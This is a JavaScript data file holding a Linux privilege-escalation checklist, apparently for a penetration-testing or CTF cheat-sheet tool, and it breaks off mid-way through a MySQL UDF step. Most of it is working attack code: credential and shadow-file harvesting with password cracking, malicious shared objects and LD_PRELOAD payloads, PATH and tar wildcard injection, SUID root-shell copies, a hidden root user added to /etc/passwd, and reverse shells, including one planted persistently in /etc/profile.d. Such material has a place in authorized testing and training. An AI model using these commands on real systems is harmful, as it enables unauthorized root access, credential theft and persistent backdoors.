checklist["linux_privesc"] = [
    {
        chapter: "1. Situational awareness & strategy",
        checks: [
            {
                title: "Initial awareness",
                description: "Initial awareness about who you are",
                code: `# 1. identify who you are
id
whoami
hostname

# 2. Check your sudo privileges
sudo -l
# If you currently dont have a password and want to see if you can run sudo to decide if you want to hunt for the users pass
# If you get info, then you can run sudo otherwise it will show you that your current user cant run sudo
sudo -v

# 3. list other users on the system
cat /etc/passwd

# 4. view the groups of other users above >= 1000
for user in $(cat /etc/passwd | awk -F: '$3 >= 1000 {print $1}'); do echo "### Groups for $user ###"; groups $user; done
`,
                code_language: bash,
            },
            {
                title: "Network information",
                description: "Gather information about the NIC, routes, and ARP table.",
                code: `# 1. Networking information - check your IP-addresses
# 1A. List network interfaces (check for multiple network adapters)
ifconfig
ip a
ipa

# 1B. View known routes
ip route
route

# 1C. View the ARP table (other hosts inside the network)
ip neigh

# 2. view listening ports and services
netstat -ntlp
ss -tulpen

# 3. show firewall rules (if iptables is used)
cat /etc/iptables/rules.v4`,
                code_language: bash,
            },
            {
                title: "Kernel & OS Information",
                description: "Gather information about the Kernel & OS Information",
                code: `# 1. Display kernel and version information
uname -a

# 2. Display detailed kernel version
cat /proc/version

# 3. Display the OS release information
cat /etc/os-release

# 4. Display CPU architecture details
lscpu`,
                code_language: bash,
            },
            {
                title: "Service account strategy",
                description: "try to find service accounts and their credentials to move laterally or vertically within the system or network",
                code: `# 1. Search for credentials in (web)app application files
# Search for various credential-related terms in application files
grep -rni 'pass\\|password\\|pwd' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'pass|password|pwd'
grep -rni 'database\\|db_host\\|db_name\\|db_user' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'database|db_host|db_name|db_user'
grep -rni 'connection\\|connect\\|conn_string' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'connection|connect|conn_string'
grep -rni 'api_key\\|apikey\\|secret\\|token' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'api_key|apikey|secret|token'
grep -rni 'username\\|user\\|login' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'username|user|login'
grep -rni 'credential\\|auth' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE 'credential|auth'

# environment specific - search for local or application users
grep -rni '<LOCALUSER>' <APP_ROOT> 2>/dev/null | cut -c1-100 | grep --color=always -iE '<LOCALUSER>'

# Example: Check common config file locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null

# 2. If database access is available, search for passwords/hashes in database
mysql -u root -p'{{PASSWORD}}'

# 3. If database location is unknown, use 1 of the following search terms in google to find it (use the application name in place of "openfire"):
# Example: "Openfire local database location filesystem" or "openfire database location"

# 4. use credentials to move laterally or vertically within the system or network
`,
                code_language: bash,
            },
            {
                title: "Process enumeration",
                description: "",
                code: `# 1. Check processes running as root
ps aux | grep "^root"

# 2. List running processes in a tree structure
ps -ef --forest

# 3. Monitor processes in real-time (great for catching cron jobs)
watch -n 1 "ps aux | grep root"

# 4. Use pspy to monitor processes without root permissions
./pspy64

#####
# If you see any root/uid 0 processes running; take note of the files being executed. Are the files writeable to you? Are their any factors the script or process is running you can overwrite or modify?

# Make sure you read the contents of the scripts running and look at their permissions to determine if anything abusable is present. For example if the script does cd /some/directory/you/can/write and uses ./ convention thus meaning that you can potentially replace a file or create a file within that directory that the script is executing an element from
#####
`,
                code_language: bash,
            },
            {
                title: "Essential enumeration scripts",
                description: "",
                code: `# Automated enumeration tools
# 1. linpeas                
./linpeas_fat.sh -e

# 2. linenum
./LinEnum.sh

# 3. linux-exploit-suggester
./linux-exploit-suggester-2.pl

# 4. Linux Smart Enumeration
./lse.sh -l2

# 5. pspy
./pspy32
./pspy64

# run a script, output to file for later review
./script | tee output.txt
`,
                code_language: bash,
            },
            {
                title: "Advanced Process Monitoring",
                description: "",
                code: `# 1. Pipe pspy output to filter for interesting events
./pspy64 | grep -E "(uid=0|root|admin|shadow|cron)"

# 2. Monitor file modifications in real-time
inotifywait -m -r /etc /var/www /opt 2>/dev/null

# 3. Check if any processes are connecting to unexpected ports
watch -n 1 "netstat -tulpn | grep LISTEN"`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "2. Password Mining & Credentials Hunting",
        checks: [
            {
                title: "Search for sensitive filenames, keywords and extensions",
                description: "Search for sensitive files",
                code: `# 1. search for sensitive files based on file names and keywords within the files (with directory grouping)
(find /var /opt /home -type f \\( -iname "*password*" -o -iname "*passwd*" -o -iname "*pwd*" -o -iname "*credential*" -o -iname "*secret*" -o -iname "*database*" -o -iname "*db*" -o -iname "*login*" -o -iname "*config*" -o -iname "*backup*" \\) 2>/dev/null; grep -ril -E 'password|passwd|pwd|credential|secret|database|db|login|config|backup' /var /opt /home 2>/dev/null) | awk '{dir=gensub(/\\/[^\\/]*$/,"","g",$0); count[dir]++; files[dir]=files[dir]"\\n"$0} END{for(d in count){if(count[d]>=5){print d"/ ("count[d]" files found)"}else{print files[d]}}}'

# 2. search for sensitive files based on file extensions (with directory grouping)
find / -type f -iname "*.kdbx" 2>/dev/null | grep -vE '/proc|/sys|/dev|/run|/etc' | awk '{dir=gensub(/\\/[^\\/]*$/,"","g",$0); count[dir]++; files[dir]=files[dir]"\\n"$0} END{for(d in count){if(count[d]>=10){print d"/ ("count[d]" files found)"}else{print files[d]}}}'
find / -type f \\( -iname "*.txt" -o -iname "*.ini" \\) 2>/dev/null | grep -vE '/proc|/sys|/dev|/run|/etc' | awk '{dir=gensub(/\\/[^\\/]*$/,"","g",$0); count[dir]++; files[dir]=files[dir]"\\n"$0} END{for(d in count){if(count[d]>=10){print d"/ ("count[d]" files found)"}else{print files[d]}}}'
find / -type f \\( -iname "*.txt" -o -iname "*.pdf" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.doc" -o -iname "*.docx" \\) 2>/dev/null | grep -vE '/proc|/sys|/dev|/run|/etc' | awk '{dir=gensub(/\\/[^\\/]*$/,"","g",$0); count[dir]++; files[dir]=files[dir]"\\n"$0} END{for(d in count){if(count[d]>=10){print d"/ ("count[d]" files found)"}else{print files[d]}}}'`,
                code_language: "bash",
            },
            {
                title: "User Home Directories",
                description: "",
                code: `# 1. Check environment files for credentials
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_history

# 2. Check for content in common directories
ls -la ~/Documents
ls -la ~/Downloads
ls -la ~/Desktop
ls -la /opt
ls -la /var/backup
ls -la /var/log
ls -la /var/www/html
ls -la /
ls -la ~

# 3. Look for uncommon filesystems
df -h | grep -v "tmpfs\\|proc\\|sysfs\\|devtmpfs\\|cgroup"`,
                code_language: bash,
            },
            {
                title: "Configuration files",
                description: "",
                code: `# 1A. Legacy password storage (older systems)
cat /etc/passwd

# 1B. Check shadow file access
cat /etc/shadow

# 1C. If readable, crack passwords:
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# 2. Database configuration files
find /var/www/ -name "*config*" -type f 2>/dev/null
find /var/ -name "settings.php" -type f 2>/dev/null # Drupal

# 3. find all hidden files in a directory
find /var/www/ -type f -name ".*" 2>/dev/null

# 4. Web server configs - often contain database credentials
find /etc/apache2/ -name "*.conf" -type f -exec grep -i -l "pass\\|db_passwd\\|dbpasswd\\|pwd" {} \\;
find /etc/httpd/ -name "*.conf" -type f -exec grep -i -l "pass\\|db_passwd\\|dbpasswd\\|pwd" {} \\;
find /etc/nginx/ -name "*.conf" -type f -exec grep -i -l "pass\\|db_passwd\\|dbpasswd\\|pwd" {} \\;

# 5. SSH configuration
cat /etc/ssh/sshd_config | grep -i "PermitRootLogin\\|PasswordAuthentication"

# 6. Look for connection strings in code files
grep -r --include="*.php" -l "connect\\|mysqli\\|getenv" /var/www/ 2>/dev/null
grep -r --include="*.js" -l "api_key\\|apikey\\|password\\|passwd\\|pwd" /var/www/ 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "Command history",
                description: "",
                code: `# 1. Check command history for credentials (in various shells)
history
cat ~/.*history

# 2. Find all history files 
find / -name "*_history" -type f 2>/dev/null

# 3. One-liner to search all history files for passwords
find / -name "*_history" -type f 2>/dev/null | xargs grep -i "password\\|pass\\|pwd"`,
                code_language: bash,
            },
            {
                title: "Recursive search",
                description: "",
                code: `# Two main things to note here when preforming this search. Make sure you change the string. So maybe you add passw, and then try password, pwd, creds, cred etc

# The second high fidelity check is using usernames; so if you note some user who is a member of the docker or sudo group then you may want to desprately get their password and so I would use the commands below and search for them via username

# 1. Search for files with "passw" in filename
locate passw | more

# 2. Deep search for password strings (use in critical directories only)
grep --color=auto -R -i "passw" --color=always /etc/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /var/www/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /home/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /opt/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /mnt/ 2>/dev/null

# 3. Catches: $password='value', password='value', password:"value", PASSWORD=value, etc.
find /var/www /opt /etc /home -type f \\( -name "*.php" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" -o -name "*.yml" \\) 2>/dev/null | xargs grep -E "(password|passwd|pwd|pass)[[:space:]]*[=:][[:space:]]*['\\"][^'\\"]+['\\"]" 2>/dev/null

# 4. Find files containing password strings (less noisy)
find /etc -type f -exec grep -l "password" {} \\; 2>/dev/null

# 5. Find world-readable configuration files
find /etc -type f -perm -o=r -name "*.conf" 2>/dev/null

# 6. Search for password in files modified in the last 7 days
find / -type f -mtime -7 -readable -exec grep -l -i "password" {} \\; 2>/dev/null

# 7. Find logs that might contain sensitive info
find /var/log -type f -name "*.log" -readable -exec grep -l -i "password\\|login\\|credential" {} \\; 2>/dev/null

# 8. Find hidden directories that may have credentials
find / -type d -name ".*" -ls 2>/dev/null | grep -v "^\\.\\.$"

# 9. Search for interesting strings in all files (be cautious, produces a lot of output)
grep -l -i "password\\|passw\\|pwd\\|db_passwd\\|dbpasswd" $(find / -readable -type f 2>/dev/null)
`,
                code_language: bash,
            },
            {
                title: "Find ssh keys",
                description: "Find ssh keys",
                code: `# 1. Find SSH authorized keys and private keys
find / -name authorized_keys 2> /dev/null

# 2. Find private SSH keys
find / -name id_* 2> /dev/null`,
                code_language: bash,
            },
            {
                title: "Mail Content",
                description: "",
                code: `# 1. read out the mail content - with SMTP enabled this is a must!
cat /var/mail/$(whoami)
cat /var/spool/mail/$(whoami)`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "3. SUID/SGID Binary exploitation & getcap",
        checks: [
            {
                title: "Finding SUID/ SGID binaries",
                description: "List all SUID and SGID binaries on the system",
                code: `# 1. list all SUID binaries (User execution rights)
find / -perm -4000 -type f -printf '%T+ %p\\n' 2>/dev/null | sort -r

# 2. list all SGID binaries (Group execution rights)
find / -perm -2000 -type f -printf '%T+ %p\\n' 2>/dev/null | sort -r

# 3. find both SUID and SGID binaries - color coded, sort by date
{ find / -type f -perm -4000 -printf '\\033[1;31mSUID:\\033[0m %T+ %p\\n' 2>/dev/null | sort -t' ' -k2 -r; find / -type f -perm -2000 ! -perm -4000 -printf '\\033[1;33mSGID:\\033[0m %T+ %p\\n' 2>/dev/null | sort -t' ' -k2 -r; }

# 4. SUID/SGID binaries that are treated differently
# 4A. doas - allows a user to run a command as another user
# - look for 'doas.conf'
# - reference : https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/
find / -iname doas.conf 2> /dev/null`,
                code_language: bash,
            },
            {
                title: "File capabilities exploitation",
                description: "",
                code: `# Linux capabilties are a granular way of providing elevated permissions to a file to allow it to do a specific action. For example a capability can allow a file to preform file reads as if they are root(meaning read any file)
# 1. Find binaries with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities:
# CAP_SETUID - allows changing of UID
# CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
# CAP_DAC_READ_SEARCH - bypass file/directory read permission checks
# CAP_SYS_ADMIN - basically root
# CAP_NET_RAW - packet sniffing
# CAP_CHOWN - Change file ownership
# +ep means the file can do anything as root(basically setuid)

# Example exploitation:
# If python has cap_setuid+ep
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc`,
                code_language: bash,
            },
            {
                title: "Shared object injection",
                description: "",
                code: `##### REQUIREMENTS:
# A. SUID binary calls missing shared object (.so) file
# B. Write access to the d irectory containing the missing .so file
                
# 1A. Find missing shared objects with strace
strace /path/to/suid/binary 2>&1 | grep -i -E "open|access|no such file"

# Alternative: use ltrace to also see library calls
ltrace /path/to/suid/binary 2>&1 | grep -i -E "open|access|dlopen"

# 1B. Create malicious shared object
# --- START --- #
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p");
}
EOF
# --- END --- #
##### COMPILE COMMAND:
gcc -shared -fPIC -o /path/to/missing.so /tmp/evil.c

# Run the SUID binary
/path/to/suid/binary

# Execute with elevated privileges
/tmp/rootbash -p`,
                code_language: bash,
            },
            {
                title: "One-liners to Hunt for Vulnerable SUID Binaries",
                description: "",
                code: `# 1. Find SUID programs calling system() function
for suid in $(find / -type f -perm -4000 2>/dev/null); do strings $suid | grep -i "system(" && echo "System call found in $suid"; done

# 2. Find SUID programs importing insecure library functions
for suid in $(find / -type f -perm -4000 2>/dev/null); do objdump -T $suid 2>/dev/null | grep -E "system|exec|fork|bash" && echo "Vulnerable import in $suid"; done

# 3. Check for SUID programs with relative path bin calls
for suid in $(find / -type f -perm -4000 2>/dev/null); do strings $suid | grep -E "^[a-zA-Z0-9_-]{1,30}$" | sort -u | xargs which 2>/dev/null | grep -v "^/"; done

# 4. Find custom (non-standard) SUID binaries that might be vulnerable
find / -type f -perm -4000

# Check the strings in SUID binary, espcially if it looks custom and see if its calling other programs or executing files without full path`,
                code_language: bash,
            },
            {
                title: "Environment Variable Exploitation",
                description: "",
                code: `##### REQUIREMENTS:
# A. SUID binary makes relative calls to other programs
# B. Control over PATH environment variable

# 1A. Check for binary calls using strings
strings /usr/local/bin/suid-binary

# 1B. Determine if binary uses system() or execve() with relative paths
strace -v -f -e execve /usr/local/bin/suid-binary 2>&1 | grep exec

# 1C. Alternative: use ltrace to track library calls
ltrace /usr/local/bin/suid-binary 2>&1 | grep -E "system|exec|popen"

# 1D. Modify PATH to include our malicious directory
export PATH=/tmp:$PATH

# 1E. Create malicious binary matching the relative call name
cat > /tmp/program_name << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/program_name

# 1F. Execute the SUID binary
/usr/local/bin/suid-binary

# 1G. Run with elevated privileges
/tmp/rootbash -p`,
                code_language: bash,
            },
            {
                title: "Abusing Shell Features (Bash < 4.2-048)",
                description: "",
                code: `# 1. Verify bash version is vulnerable
bash --version

# 2. Create a bash function with absolute path
function /usr/sbin/service { /bin/bash -p; }

# 3. Export the function
export -f /usr/sbin/service

# 4. Execute the SUID binary
/usr/local/bin/suid-binary`,
                code_language: bash,
            },
            {
                title: "Abusing Bash Debugging Mode",
                description: "",
                code: `# For binaries that use system() or similar and run via bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-binary

# Execute the rootbash
/tmp/rootbash -p`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "4. Cron Job exploitation",
        checks: [
            {
                title: "Enumeration",
                description: "",
                code: `# 1. Real-time monitoring of running processes
./pspy64

# Check configured cron jobs
crontab -l
ls -alh /var/spool/cron/
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/crontab
find /etc/cron* -type f -readable 2>/dev/null


# 2. Check user crontabs
for user in $(cat /etc/passwd | cut -f1 -d':'); do echo "### Crontabs for $user ####"; crontab -u $user -l 2>/dev/null; done

# Check systemd timers (newer alternative to cron)
systemctl list-timers --all
find /etc/systemd/system -type f -name "*.timer" -ls 2>/dev/null
find /usr/lib/systemd/system -type f -name "*.timer" -ls 2>/dev/null

# 3. One-liner to find world-writable cron job targets
find $(cat /etc/crontab | grep -v "#" | grep -v "^$" | awk '{print $NF}' 2>/dev/null) -writable 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "File Overwrite Attack",
                description: "",
                code: `##### REQUIREMENTS:
# Cron job runs as root
# Write access to the executed script/binary

# 1. Overwrite the target script (If you've got the correct permissions)
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /path/to/overwritable/script

# 2. Make sure it's executable
chmod +x /path/to/overwritable/script

# 3. Wait for cron job to execute, then run
/tmp/rootbash -p
`,
                code_language: bash,
            },
            {
                title: "PATH Variable Attack",
                description: "",
                code: `##### REQUIREMENTS:
# A. Cron job runs as root
# B. Cron job uses relative paths
# C. Write access to a directory in the PATH

# Example of vulnerable crontab:
* * * * * root tar czf /tmp/backup.tar.gz /home/user/*

##### START EXPLOITATION

# --- START --- #
# Create malicious executable in writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/overwrite

# Make it executable 
chmod +x /home/user/overwrite

# Wait for cron job to execute, then run
/tmp/rootbash -p
# --- END --- #

##### END EXPLOITATION
`,
                code_language: bash,
            },
            {
                title: "Wildcard Injection Attack",
                description: "",
                code: `##### REQUIREMENTS:
# A. CRON jobs runs as root
# B. Script uses wildcards (e.g., tar czf /backup.tar.gz *)

# Example vulnerable script
# --- START --- #
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
# --- END --- #

# OPTION 1: Using tar checkpoint feature
# --- START --- #
# 1. Create payload script
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/runme.sh
chmod +x /home/user/runme.sh

# 2. Create checkpoint files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\\ runme.sh

# 3. Wait for tar command to run with wildcard, then
/tmp/rootbash -p
# --- END --- #

# OPTION 2: using different tar flag injection
# --- START --- #
# Simple reverse shell
echo 'bash -i >& /dev/tcp/{{LHOST}}/{{RHOST}} 0>&1' > shell.sh
chmod +x shell.sh
touch "/home/user/--checkpoint-action=exec=sh shell.sh"
touch /home/user/--checkpoint=1
# --- END --- #

##### Other command flags for wildcard injection
# For tar
touch /home/user/--use-compress-program='nc 10.10.10.10 4444 -e /bin/bash'

# For rsync 
touch /home/user/-e sh\\ shell.sh

# For chown
touch /home/user/--reference=shell.sh
`,
                code_language: bash,
            },
            {
                title: "Git cron privilege escalation",
                description: "",
                code: `##### REQUIREMENTS:
# - Write access to a Git repository via restricted git-shell
# - SSH key allowing push access
# - Root-owned cronjob executing a script from the repository

##### REFERENCE:
# - PG-practice box: hunit

##### DESCRIPTION:
A low-privileged user can push changes to a Git repository that is trusted and executed by a root cronjob. Modified scripts are executed as root, leading to privilege escalation.

##### START EXPLOITATION
# 1. Clone repository:
git clone /within/.git/folder
GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git clone git@192.168.204.125:/git-server

# 2. Modify root-executed script (e.g. backup.sh):
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# 3. Commit and push:
GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git add .
GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git commit -m "Modified backup.sh"
GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git push origin HEAD

# 4. Wait for cron execution and spawn root shell:
/tmp/rootbash -p

##### END EXPLOITATION`,
                code_language: bash,
            }
        ]
    },
    {
        chapter: "5. Service Exploitation & startup script",
        checks: [
            {
                title: "List all Services and Processes",
                description: "Use these commands to gather information about the operating system, CPU details, and running processes.",
                code: `# 1. View active network connections with process names
netstat -ntlp

# 2. List all running services
netstat -ano | grep -i listen
`,
                code_language: bash,
            },
            {
                title: "Identifying Vulnerable Startup Scripts",
                description: "",
                code: `# 1. Check for startup scripts writable by the current user in various locations
find /etc/init.d -writable 2>/dev/null
find /etc/rc.d -writable 2>/dev/null
find /etc/rc.d/init.d -writable 2>/dev/null
find /etc/init -writable 2>/dev/null
find /etc/systemd/system -writable 2>/dev/null
find /usr/lib/systemd/system -writable 2>/dev/null

# 2. Check for writable system-wide profile scripts
find /etc/profile.d -writable 2>/dev/null
find /etc/profile -writable 2>/dev/null
find /etc/bash.bashrc -writable 2>/dev/null
 
# 3. Find scripts with SUID/SGID permissions that might be called during startup
find / -perm -u+s -type f -exec ls -la {} \\; 2>/dev/null | grep -E "\\/etc\\/(init|rc)"

# 4. Find service configurations that run as root
grep -r "User=root\\|UID=0" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "Script Modification Attack",
                description: "",
                code: `# 1. Backup original script (good practice)
cp /etc/init.d/vulnerable_script /tmp/backup

# OPTION 1: Replace or edit startup script directly
cat > /etc/init.d/vulnerable_script << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Original script follows
$(cat /tmp/backup)
EOF

# Make sure it's executable
chmod +x /etc/init.d/vulnerable_script

# OPTION 2: Add reverse shell to system-wide profile
echo 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' >> /etc/profile.d/shell.sh
chmod +x /etc/profile.d/shell.sh

# OPTION 3: Create a malicious systemd service
cat > /etc/systemd/system/privesc.service << EOF
[Unit]
Description=Privilege Escalation Service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
Restart=no

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the malicious service if you have sudo rights
sudo systemctl enable privesc.service
sudo systemctl start privesc.service

# Post running rootbash to upgrade our shell fully
python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' #You can also use python3 with the same command if its present instead`,
                code_language: bash,
            },
            {
                title: "One-liners to Identify Service Vulnerabilities",
                description: "",
                code: `# 1. Find world-writable service configuration files
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# 2. Check for processes running as root with open file descriptors to writable files
lsof -u root | grep REG | grep -v "mem" | grep -v "txt" | grep -v "cwd" | grep -v 'kernel' | awk '{print $9}' | xargs -I{} ls -la {} 2>/dev/null | grep -v "^l" | grep "^.rw"

# 3. Find scripts in PATH that are executed by root but writable by you
for p in $(echo $PATH | tr ":" " "); do find $p -writable -type f 2>/dev/null; done`,
                code_language: bash,
            },

        ]
    },
    {
        chapter: "6. File Permission Exploitation",
        checks: [
            {
                title: "Find most recently Readable/Writable Files and Directories",
                description: "",
                code: `# 1. find the most recently edited/ created readable files
find / -readable -type f -printf '%T+ %p\\n' 2>/dev/null | grep -Ev '\\.0000000000 |/(var|proc|run|sys|usr|boot)/' | sort -r

# 2. find the most recently edited/ created writable files
find / -writable -type f -printf '%T+ %p\\n' 2>/dev/null | grep -Ev '\\.0000000000 |/(var|proc|run|sys|usr|boot)/' | sort -r

# 3. find writeable directories
find / -type d -maxdepth 5 -writable 2>/dev/null

# 4. find writable files
find / -type f -maxdepth 5 -writable 2>/dev/null`,
                code_language: bash,
            },

        ]
    },
    {
        chapter: "7. Group Membership Exploitation",
        checks: [
            {
                title: "group membership exploitation",
                description: "",
                code: `# 1. Check your current groups
id
groups

# 2. Find files owned by a specific group
find / -group docker -ls 2>/dev/null
find / -group sudo -ls 2>/dev/null
find / -group admin -ls 2>/dev/null
find / -group adm -ls 2>/dev/null
find / -group shadow -ls 2>/dev/null
find / -group lxd -ls 2>/dev/null

# 3. Find all files belonging to groups you're a member of
for group in $(groups); do echo "Files for group $group:"; find / -group $group 2>/dev/null | grep -v "^/proc\\|^/sys\\|^/run"; done

# 4. Find all scripts that belong to your groups and are executable
for group in $(groups); do find / -type f -group $group -perm -u=x 2>/dev/null | grep -v "^/proc\\|^/sys"; done

# 5. Use stat to inspect file permissions by group
stat /etc/passwd /etc/shadow /etc/group
`,
                code_language: bash,
            },
            {
                title: "docker-group",
                description: "",
                code: `# 1. If you're in the docker group
docker run -v /:/mnt -it alpine chroot /mnt sh
# Now you have root access to the host filesystem

# 2. Another method
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh`,
                code_language: bash,
            },
            {
                title: "LXD/LXC Group",
                description: "",
                code: `# 1. On attacker machine, prepare an image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

# 2. Transfer the alpine-*.tar.gz file to the target
# 3. On target, if you're in the lxd group
lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root`,
                code_language: bash,
            },
            {
                title: "Disk/DiskAdmin Group",
                description: "If you're in the disk group, you have raw access to disks",
                code: `##### REFERENCE:
# https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=disk%20group#disk-group
                
# 1. list which disks are present
df -h
lsblk
                
# 2. mount the disk with debugfs (select the disk which mounts the '/' filesystem)
debugfs /dev/sda1

# 3. list the files or directories you want to read
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow`,
                code_language: bash,
            },
            {
                title: "Video Group",
                description: "",
                code: `# 1. Members of the video group can access GPU memory, which may contain sensitive data
cat /dev/fb0 > /tmp/screen.raw

# 2. Analyze the raw framebuffer data

# 3. Also access HDMI/display info that may contain sensitive data
cat /sys/class/graphics/fb*/virtual_size`,
                code_language: bash,
            },
            {
                title: "ADM Group",
                description: "",
                code: `# 1. Members of adm can read log files, which may contain sensitive information
find /var/log -type f -readable -exec grep -i -E "password|pass|pwd|user|login" {} \\;

# 2. Look for sudo password entries
grep -i "sudo" /var/log/auth.log`,
                code_language: bash,
            },
            {
                title: "Shadow Group",
                description: "",
                code: `# 1. If you're in the shadow group
cat /etc/shadow

# 2. Create a new /etc/passwd entry with root UID/GID but a password you know
openssl passwd -1 -salt xyz newpassword

# add the user tempUserG only if it does not exist
grep -q '^tempUserG:' /etc/passwd || echo "tempUserG:$(openssl passwd -1 DiffPword951):0:0::/root:/bin/bash" >> /etc/passwd

# 3. Add new user with hash or modify root's hash `,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "8. SUDO exploitation",
        checks: [
            {
                title: "General Enumeration",
                description: "",
                code: `# 1. Check sudo permissions
sudo -l

# 2. Check recent sudo usage
cat /var/log/auth.log | grep sudo

# 3. Check sudo version for vulnerabilities
sudo -V`,
                code_language: bash,
            },
            {
                title: "Abusing a sudo binary",
                description: "",
                code: `# 1. check if the binary is known in gtfobins
https://gtfobins.org/
                
# 2. if it is a custom binary:
# - version vulnerabilities (in the script itself and imports used)
# - if it allows shell escapes
# - look for system/library calls (strace/ltrace)
# - check if you can overwrite 
#   - the binary.
#   - the folder before the binary`,
                code_language: bash,
            },
            {
                title: "SUDO configuration analysis",
                description: "",
                code: `# 1. Check sudoers file (may require privileges)
cat /etc/sudoers

# 2. Check for any custom sudo configurations
find /etc/sudoers.d/ -type f -exec cat {} \\; 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "LD_PRELOAD Exploitation",
                description: "",
                code: `##### REQUIREMENTS:
# env_keep+=LD_PRELOAD in sudoers
# At least one binary executable via sudo
# Real UID must equal effective UID (LD_PRELOAD is ignored otherwise)

# 1. Check if vulnerable (Look for: env_keep+=LD_PRELOAD)
sudo -l | grep "LD_PRELOAD"

# OPTION 1: Simple root shell

# --- START --- #
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash -p");
}
EOF
# --- END --- #
##### COMPILE COMMAND:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

##### USAGE:
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>

# OPTION 2: Create SUID binary 
# --- START --- #
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF
# --- END --- #
##### COMPILE COMMAND:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

##### USAGE:
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
/tmp/rootbash -p
`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "9. Service Exploitation (MySQL, Apache, etc.)",
        checks: [
            {
                title: "MySQL Exploitation",
                description: "",
                code: `# 1. Check if MySQL runs as root
ps aux | grep mysql | grep root

# 2. Check MySQL version
mysql --version
mysqld --version

# 3. Connect to MySQL (if you have credentials)
mysql -u root -p

# 4. Create User Defined Function (UDF) to execute commands as root
# Compile the UDF shared object on your attacking machine
git clone https://github.com/rapid7/metasploit-framework.git  
cp metasploit-framework/external/source/exploits/mysql_udf/mysql_udf.c .
gcc -g -shared -Wl,-soname,my_udf.so -o my_udf.so mysql_udf.c -fPIC

# 5. Transfer to target and use in MySQL
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/my_udf.so'));
